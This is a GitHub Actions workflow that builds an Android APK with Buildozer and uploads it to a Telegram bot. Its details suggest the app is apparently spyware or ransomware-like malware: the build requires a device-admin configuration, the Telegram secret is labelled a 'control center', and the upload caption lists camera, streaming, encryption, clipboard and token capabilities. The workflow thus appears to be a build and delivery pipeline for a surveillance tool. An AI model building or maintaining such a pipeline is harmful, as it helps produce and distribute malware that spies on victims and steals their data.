name: Build Android APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-22.04

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Free Disk Space
        uses: jlumbroso/free-disk-space@main
        with:
          tool-cache: false
          android: false
          dotnet: true
          haskell: true
          large-packages: true
          docker-images: true
          swap: true

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Install System Dependencies for Kivy (minimal)
        run: |
          sudo apt update
          sudo apt install -y \
            git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses5-dev \
            libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev shared-mime-info \
            libsdl2-dev libsdl2-image-dev libsdl2-mixer-dev libsdl2-ttf-dev \
            libglew-dev

      - name: Install Python dependencies
        run: |
          pip install --user --upgrade Cython==0.29.33 buildozer

      - name: Setup Android NDK 25b
        run: |
          mkdir -p $HOME/.buildozer/android/platform
          cd $HOME/.buildozer/android/platform
          if [ ! -d "android-ndk-r25b" ]; then
            wget -q https://dl.google.com/android/repository/android-ndk-r25b-linux.zip
            unzip -q android-ndk-r25b-linux.zip
            rm android-ndk-r25b-linux.zip
          fi
          echo "ANDROID_NDK_HOME=$HOME/.buildozer/android/platform/android-ndk-r25b" >> $GITHUB_ENV
          echo "ANDROIDNDK=$HOME/.buildozer/android/platform/android-ndk-r25b" >> $GITHUB_ENV
          echo "NDK_HOME=$HOME/.buildozer/android/platform/android-ndk-r25b" >> $GITHUB_ENV

      - name: Verify required project files
        run: |
          echo "🔍 Checking essential files..."
          MISSING=0
          for file in project/main.py project/buildozer.spec project/config/device_admin.xml project/android/AndroidManifest.xml project/res/drawable/ic_launcher.png; do
            if [ ! -f "$file" ]; then
              echo "❌ MISSING FILE: $file"
              MISSING=1
            else
              echo "✅ $file exists"
            fi
          done
          if [ $MISSING -eq 1 ]; then
            echo "ERROR: One or more required files are missing. Check the list above."
            exit 1
          fi
          echo "✅ All required files present."

      - name: Build with Buildozer (minimal output)
        run: |
          export PATH=$PATH:$HOME/.local/bin
          cd project
          mkdir -p .buildozer/android/platform
          echo "🚀 Starting Buildozer build (this may take 20-30 minutes)..."
          buildozer android debug > build_log.txt 2>&1
          if [ $? -ne 0 ]; then
            echo "❌ Buildozer build failed. Last 100 lines of log:"
            tail -n 100 build_log.txt
            exit 1
          fi
          echo "✅ Buildozer build completed successfully."

      - name: Find and verify APK
        run: |
          cd project
          APK_PATH=$(find bin -name "*.apk" | head -n 1)
          if [ -z "$APK_PATH" ]; then
            echo "❌ No APK file found in project/bin/"
            echo "Files in bin:"
            ls -la bin/ || echo "bin directory empty or missing"
            exit 1
          fi
          echo "APK_PATH=$APK_PATH" >> $GITHUB_ENV
          echo "✅ APK found: $APK_PATH"
          ls -lh "$APK_PATH"

      - name: Send APK to Telegram
        run: |
          APK_PATH="${{ env.APK_PATH }}"
          if [ -z "$APK_PATH" ]; then
            echo "❌ APK_PATH not set. Skipping send."
            exit 1
          fi
          if [ ! -f "$APK_PATH" ]; then
            echo "❌ APK file not found at $APK_PATH"
            exit 1
          fi
          curl -v -F "chat_id=${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}" \
               -F "document=@$APK_PATH" \
               -F "caption=✅ APK v2.0 - Full Suite (Camera, Stream, Encrypt, Clipboard, Tokens)" \
               https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_1_TOKEN }}/sendDocument
          echo "✅ APK sent to Telegram."
